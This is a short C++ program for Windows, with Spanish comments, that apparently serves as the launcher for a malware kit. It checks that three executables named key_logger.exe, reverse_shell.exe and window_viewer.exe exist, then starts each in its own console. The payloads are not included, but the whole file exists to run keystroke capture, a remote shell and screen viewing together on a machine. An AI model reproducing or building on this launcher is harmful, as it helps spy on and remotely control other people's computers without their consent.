#include <iostream>
#include <fstream>
#include <Windows.h>
#include "errors.hpp"
#include <cstring>
#pragma comment(lib, "Ws2_32.lib")

std::string programs[] = {"key_logger.exe", "reverse_shell.exe", "window_viewer.exe"};

int main()
{
    // Verificar si estan todos los archivos
    for (std::string i : programs)
    {
        std::ifstream program(i);
        if (!program.good())
        {
            std::string path;
            path = "falta el archivo " + i;
            error(path.c_str(), -1);
        }
    }

    // ejecutar todos los archivos
    for (std::string i : programs)
    {
        std::cout << i << std::endl;
        STARTUPINFO si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        if (!CreateProcess(NULL, (LPSTR)i.data(), NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        {
            error("no se pudo crear los procesos de dependencias", GetLastError());
        }
    }


}